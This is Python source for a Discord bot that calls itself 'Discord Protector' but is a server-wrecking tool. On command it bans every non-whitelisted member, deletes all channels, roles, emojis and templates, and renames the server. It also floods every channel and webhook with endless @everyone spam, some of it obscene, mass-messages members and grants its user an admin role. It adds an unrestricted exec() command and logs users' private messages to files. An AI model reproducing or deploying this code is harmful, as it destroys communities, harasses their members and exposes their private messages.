import  discord,os, sys, random, string, requests, configparser, json, asyncio, time
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init,Style,Back
from os import system, name
import json
import traceback
init()

config = configparser.ConfigParser()
config.read('config.ini')

Token = config.get("Crasher", "Token")
whit = json.loads(config.get("Crasher", "Whitelist"))
blackl = json.loads(config.get("Crasher", "Blacklist"))
chats = {}

if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")


intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='!', intents=intents, help_command=None,bot=True)


async def banall(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
    
    ban = 0
    bany = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                ban += 1
                await member.ban()
                bany += 1
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
                continue
        elif member.id in whit:
            ban += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1
    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
    
async def chistch(ctx):
    await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
    with open('image.png', 'rb') as f:
       icon = f.read()
    await ctx.guild.edit(name="Концерт фейса", icon=icon)
    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
    
    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
   
async def spamhook(ctx):
  while True:
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone ', wait=True)
      except:
        continue

async def crhooks(ctx):
        
    print(f"{Fore.WHITE}> {Fore.RED}Спамим хуками{Fore.WHITE}.")
    for channel in ctx.guild.text_channels: 
        try:
            await channel.create_webhook(name='GLUSHA WAS HERE')
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал хук в {channel}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал хук в {channel}")
            continue
        print(f"{Fore.WHITE}> {Fore.RED}Заспамили хуками{Fore.WHITE}.")

async def chistrl(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        try:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
    
async def masks(ctx):
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
        except:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")

async def spamch(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(200):
        try:
                await ctx.guild.create_text_channel("CRASH9D", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не cоздал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")

async def spamrl(ctx):   
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим ролями")
    for a in range(200):
        try:
                await ctx.guild.create_role(name="Crash9d", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал роль")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")

async def chistemoji(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue 
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")

async def chisttemp(ctx):
    try:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Чистим шаблоны")
        bebrus = await ctx.guild.templates()
        for template in bebrus:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Шаблон почистил!")
            await template.delete()
        print(f"{Fore.WHITE}> {Fore.RED}Все шаблоны почистились!{Fore.WHITE}.")
    except:
        pass

async def spamth(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
      except:
        continue
@client.command()
async def aban(ctx):
    if ctx.message.author.id in whit:
        print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
        await ctx.message.delete()
        ban = 0
        bany = 0
        wta = 0
        for member in ctx.guild.members:
            if member.id not in whit:
                try:
                    ban += 1
                    await member.ban()
                    bany += 1
                    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
                except:
                    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
                    continue
            elif member.id in whit:
                ban += 1
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
                wta += 1
        print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
    
@client.command()

async def purge(ctx, limit: int):
    if ctx.author.id in blackl:
        return
    await ctx.message.delete()
    await ctx.channel.purge(limit=limit)
    print(f"{Fore.WHITE}<LOG>{Fore.WHITE} {Fore.RED}Очистил", limit,"сообщений.")


async def send(ctx,user_id:int,*,text:str ):

    user = await client.fetch_user(user_id=user_id)
    user_name = user.name
    user_discriminator = user.discriminator
    # try:
    await user.send(text)
    
    try:
        chats[f'{user_name}#{user_discriminator},{user_id}'].append(',Вы: '+text)
    except:
        chats[f'{user_name}#{user_discriminator},{user_id}']=[]
        chats[f'{user_name}#{user_discriminator},{user_id}'].append(',Вы: '+text)
    with open('chat.json','w',encoding='utf-8') as f:
        json.dump(chats,f)
    with open('chat.txt','w',encoding='utf-8') as f:
        f.write(''.join(chats))
    print(f"{Fore.WHITE}<LOG>{Fore.WHITE} {Fore.RED}Отправил:", text,"Пользователю:",user)
@client.command()
async def send(ctx,user_id:int,*,text:str ):

    user = await client.fetch_user(user_id=user_id)
    user_name = user.name
    user_discriminator = user.discriminator
    # try:
    await user.send(text)
    
    try:
        chats[f'{user_name}#{user_discriminator},{user_id}'].append(',Вы: '+text)
    except:
        chats[f'{user_name}#{user_discriminator},{user_id}']=[]
        chats[f'{user_name}#{user_discriminator},{user_id}'].append(',Вы: '+text)
    with open('chat.json','w',encoding='utf-8') as f:
        json.dump(chats,f)
    with open('chat.txt','w',encoding='utf-8') as f:
        f.write(''.join(chats))
    b=0
    for i in client.get_channel(972931385809580083).channels: 
        if i.name.partition('_')[2]==str(user_id): 
                            
            webhook = await i.create_webhook(name = ctx.message.author.name, reason = 'Cообщение')
            await webhook.send(text, avatar_url = ctx.message.author.avatar_url)
            await webhook.delete()
            b=1
    if b==0:
        c=await client.get_guild(929484122236264448).create_text_channel(str(await client.fetch_user(user_id))+'_'+str(user_id), category = client.get_channel(972931385809580083))
        # for i in client.get_channel(972931385809580083).channels: 
        #     if i.name.partition('_')[2]==str(ctx.message.author.id): 
                            
        webhook = await c.create_webhook(name = ctx.message.author.name, reason = 'Cообщение')
        await webhook.send(text, avatar_url = ctx.message.author.avatar_url)
        await webhook.delete()
    print(f"{Fore.WHITE}<LOG>{Fore.WHITE} {Fore.RED}Отправил:", text,"Пользователю:",user)
    # except:
    #     print('Не отправил сообщение:', text,"Пользователю:",user_id)
@client.command()
async def aftor(ctx, *, text:str):
    if ctx.get_user(id) not in blackl:
        aftor_id = 769919768844435466
        aftor = client.get_user(aftor_id)
        author = ctx.author.name
        ad = ctx.author.discriminator
        guild_name= ctx.guild.name
        message = text
        try:
            await aftor.send("Сообщение от "+author+ad+" Пишет с сервера: "+guild_name+' Текст: '+text) 
            await ctx.send('Сообщение отправленно автору')
        except:
            await ctx.send('Сообщение не было отправленно ')

@client.command()
async def clear(ctx, user: discord.Member,times:int):
    if ctx.author.id in blackl:
        return
    await ctx.message.delete()
    try:
        await ctx.channel.purge(limit=times, check=lambda m: m.author==user)
        print(f"{Fore.WHITE}<LOG>{Fore.WHITE} {Fore.RED} Удалил сообщения от",user)
    except:
        print(f"{Fore.WHITE}<LOG>{Fore.WHITE} {Fore.RED} Не удалось удалить сообщения от",user)


@client.command()
async def off(ctx):
    if ctx.message.author.id in whit:
        await client.change_presence(status=discord.Status.offline)
        print('Включен скрытный режим!')
@client.command()
async def on(ctx):
    if ctx.message.author.id:
        await client.change_presence(status=discord.Status.online,activity=discord.Game('Protecting 24/7'))
        print('Обычный режим включен')

@client.event #в event скобки не нужны
async def on_message(message):
    await client.process_commands(message)
    if message.author == client.user:
        pass
    else:
        
        if isinstance(message.channel, discord.channel.DMChannel):
            txt = message.content
            aftor_id = 769919768844435466
            aftor = client.get_user(aftor_id)
            user_id = message.author.id
            user_name = message.author.name
            user_discriminator = message.author.discriminator
            try:
                chats[f'{user_name}#{user_discriminator},{user_id}'].append(user_name+'#'+user_discriminator+': '+txt)
            except:
                chats[f'{user_name}#{user_discriminator},{user_id}'] = []
                chats[f'{user_name}#{user_discriminator},{user_id}'].append(user_name+'#'+user_discriminator+': '+txt)
            with open('chat.json','a',encoding='utf-8') as f:
                json.dump(chats,f)
            with open('chat.txt','a',encoding='utf-8') as f:
                f.write(''.join(chats))
            if user_name != 'Partnerships':
                # await aftor.send(f'Текст: {message.content}\nСообщение от {user_name}#{user_discriminator} ({user_id}) ')
                
                        
                guild=client.get_guild(929484122236264448).text_channels
                b=0
                for i in client.get_channel(972931385809580083).channels: 
                    if i.name.partition('_')[2]==str(message.author.id): 
                            
                        webhook = await i.create_webhook(name = message.author.name, reason = 'Cообщение')
                        await webhook.send(message.content, avatar_url = message.author.avatar_url)
                        await webhook.delete()
                        b=1
                    
                if b==0: 
                    c=await client.get_guild(929484122236264448).create_text_channel(str(message.author).replace('_','')+'_'+str(message.author.id), category = client.get_channel(972931385809580083))
                    # for i in client.get_channel(972931385809580083).channels: 
                    #     if i.name.partition('_')[2]==str(message.author.id): 
                            
                    webhook = await c.create_webhook(name = message.author.name, reason = 'Cообщение')
                    await webhook.send(message.content, avatar_url = message.author.avatar_url)
                    await webhook.delete()
            print(Fore.WHITE+'<LOG>'+Fore.RED+'Отправил <'+message.content+'> от '+user_name+'#'+user_discriminator+' Вам')
        else: 
            if message.author.id in whit and message.channel.id in [i.id for i in client.get_channel(972931385809580083).channels]:
                a=await client.fetch_user(int(message.channel.name.partition('_')[2]))
                await a.send(message.content)
                print(Fore.WHITE+'<LOG>'+Fore.RED+'Отправил <'+message.content+'> '+str(a))
                

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
    print(f"""{Fore.RED}
    
    

  ____ _    _   _ _____ _____ _   _ 
 / ___| |  | | | |_   _| ____| \ | |
| |  _| |  | | | | | | |  _| |  \| |
| |_| | |__| |_| | | | | |___| |\  |
 \____|_____\___/  |_| |_____|_| \_|

{Fore.RED} Здрасьте, это Discord Protector. Ваш новый помошник
{Fore.RED} Полное адище начинается ;){Style.RESET_ALL}""")
# @client.event

# async def on_member_update(before, after):
#     if before.user.id == 903336854152159304:
#         if str(before.status) != 'offline'  and str(after.status) == 'offline':
#             print('Не онлайн с ',time.time())
#         else:
#             print('Вошел в онлайн ', time.time())
#             c=True
@client.command()
async def code(ctx,*,m:str): 
    try:   
        exec(m)    
        print('Успешно выполнил команду')
        await ctx.send('Успешно выполнил команду')
    except:
        aftor_id = 769919768844435466
        aftor = client.get_user(aftor_id)
        await ctx.send('Ошибка:\n'+traceback.format_exc())
@client.command()
async def create_invite(ctx, server_id: int):
    guild = client.get_guild(server_id)
    invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
    await ctx.send(f"https://discord.gg/{invite.code}")
@client.command()
async def hlp(ctx):
    if ctx.message.author.id in whit:
        await ctx.message.delete()
        asyncio.create_task(chisttemp(ctx))
        asyncio.create_task(banall(ctx))
        asyncio.create_task(chistch(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(chistemoji(ctx))
        asyncio.create_task(chisttemp(ctx))
        await chistrl(ctx)

        asyncio.create_task(masks(ctx))
        asyncio.create_task(spamch(ctx))
        await spamrl(ctx)
        print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")


  
@client.command()
async def say(ctx,times:int ,*,arg:str ):
        if ctx.author.id in blackl:
            return
        for iboba in range(times):
            await ctx.send(arg)
        print(f"{Fore.WHITE}> {Fore.RED}Отправил{Fore.WHITE}.", arg,times,"раз")
@client.command()
async def users(ctx,text):
    if ctx.message.author.id in whit:
        await ctx.message.delete()
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаю рассылку пользователям")
        for member in ctx.guild.members:
            if member.id not in whit:
                for i in range(1):
                    try:
                        await member.send(text)
                        print(f'Сообщение было отправлено пользователю {member}')
                    except:
                        print(f'Сообщение не было отправлено пользователю {member}')
            elif member.id in whit:
                print('Не трогаю допущенного',member)
                
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]  Закончил рассылку пользователям")
# @client.command()
# async def help(ctx):
#   embed = discord.Embed(
#     title = 'Discord Protector',
#     colour = 4374015,
#     description = '👨‍💻Привет! Я - твой новый защитник! Для начала ознакомимся с командами👨‍💻:\n```\n$ - префикс 🤖\n```\n```\n$help - помощь 🤗\n```\n```\n$hlp - гайд по боту 🧐\n```\n```\n$start - начать защиту 👾\n```\n```\n$hooks - сконфигурировать защиту 🛠️\n```\n```\n$cl - автоконфигурация для сервера 🔧\n```\n```\n$aban - Баны 🚫\n```\n```\n$ghelp - Кики 🦶\n```');

#   await ctx.send(embed=embed)

@client.command()
async def addrole(ctx,role:int, user: discord.Member):
    guild = ctx.guild # You can remove this if you don't need it for something other
    role = ctx.guild.get_role(role)
    await user.add_roles(role)
    print(f'{Fore.WHITE} >> {Fore.RED} Роль: {role} выдана юзеру {user}')

@client.command()
async def delrole(ctx,role:int, user: discord.Member):
    guild = ctx.guild # You can remove this if you don't need it for something other
    role = ctx.guild.get_role(role)
    await user.remove_roles(role)
    print(f'{Fore.WHITE} >> {Fore.RED} Роль: {role} убрана у юзера {user}')  

@client.command()
async def game(ctx, pos: int):
    if ctx.message.author.id in whit:
        await ctx.message.delete()
        try:
            await ctx.guild.create_role(name="Админка", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
            role = discord.utils.get(ctx.guild.roles, name="Админка")
            await role.edit(position=pos, reason="Админ попросил")
            await ctx.message.author.add_roles(role)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
        except discord.HTTPException:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
        

@client.command()
async def start(ctx):
    if ctx.message.author.id in whit:
        await ctx.message.delete()
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            try:
                await role.delete()
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
                continue
        print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")

async def spamth(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
      except:
        continue

@client.command()
async def ml(ctx):
    if ctx.message.author.id in whit:
        await ctx.message.delete()
        
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx))
        asyncio.create_task(spamth(ctx)) 
        asyncio.create_task(spamth(ctx))

@client.command()
async def ghelp(ctx):
    if ctx.author.id in blackl:
        return
    await ctx.message.delete()
    rls = 0
    for role in ctx.guild.roles:
     rls +=1
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}, по счету {rls}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Найдено {rls} ролей")


@client.command()
async def gif(ctx):
    if ctx.message.author.id in whit:
        await ctx.message.delete()
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Рассылаем гифки")
        for channel in ctx.guild.text_channels:
            await channel.send("https://gfycat.com/flakyacrobatickusimanse")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")

@client.command()
async def hooks(ctx):
    if ctx.message.author.id in whit:
        await ctx.message.delete()
        await crhooks(ctx)
        asyncio.create_task(spamhook(ctx))
        asyncio.create_task(spamhook(ctx))
        asyncio.create_task(spamhook(ctx))
        asyncio.create_task(spamhook(ctx))
        asyncio.create_task(spamhook(ctx))
        asyncio.create_task(spamhook(ctx))
@client.command()
async def story(ctx):
    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','w',encoding='utf-8') as f:
        f.close()
    for i in await ctx.channel.history(limit=60000,oldest_first=True).flatten():
        if len(i.raw_mentions)>0:
            m=[]
            
            for x in i.raw_mentions:
                mention=str(x)
                try:
                    user=await client.fetch_user(int(mention.strip('<>@')))
                except:
                    await ctx.send(int(mention.strip('<>@')))
                mes=i.content
                mes=mes.replace(mention,str(user))
                
            if len(i.attachments) <1:
                if len(i.stickers)<1:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,mes)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+str(mes)+'\n')
                else:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,mes, Back.BLUE,f'\n {[x.image_url for x in i.stickers]}',Style.RESET_ALL)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+mes+str(f'\n {[x.image_url for x in i.stickers]}')+'\n')
            else:
                if len(i.stickers)<1:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,mes, Back.BLUE,f'\n {[x.url for x in i.attachments]}',Style.RESET_ALL)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+mes+str(f'\n {[x.url for x in i.attachments]}')+'\n')
                else:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,mes, Back.BLUE,f'\n Вложения {[x.url for x in i.attachments]}','\nСтикеры'+[x.image_url for x in i.stickers],Style.RESET_ALL)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+mes+str(f'\n Вложения: {[x.url for x in i.attachments]}')+'\nСтикеры'+[x.image_url for x in i.stickers]+'\n')

        else:
            if len(i.attachments) <1:
                if len(i.stickers)<1:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,i.content)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+str(i.content)+'\n')
                else:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,i.content, Back.BLUE,f'\n {[x.image_url for x in i.stickers]}',Style.RESET_ALL)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+i.content+str(f'\n {[x.image_url for x in i.stickers]}')+'\n')
            else:
                if len(i.stickers)<1:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,i.content, Back.BLUE,f'\n {[x.url for x in i.attachments]}',Style.RESET_ALL)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+i.content+str(f'\n {[x.url for x in i.attachments]}')+'\n')
                else:
                    print(Fore.RED,i.author,Style.RESET_ALL,Back.GREEN, f'( {i.created_at} ):',Style.RESET_ALL,i.content, Back.BLUE,f'\n Вложения {[x.url for x in i.attachments]}','\nСтикеры'+[x.image_url for x in i.stickers],Style.RESET_ALL)
                    with open('D:/Users/Maxim/Documents/ds_main/death_note_story.txt','a',encoding='utf-8') as f:
                        f.write('\n'+str(i.author)+ f' ( {i.created_at} ): '+i.content+str(f'\n Вложения: {[x.url for x in i.attachments]}')+'\nСтикеры'+[x.image_url for x in i.stickers]+'\n')

try:
    client.run(Token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()
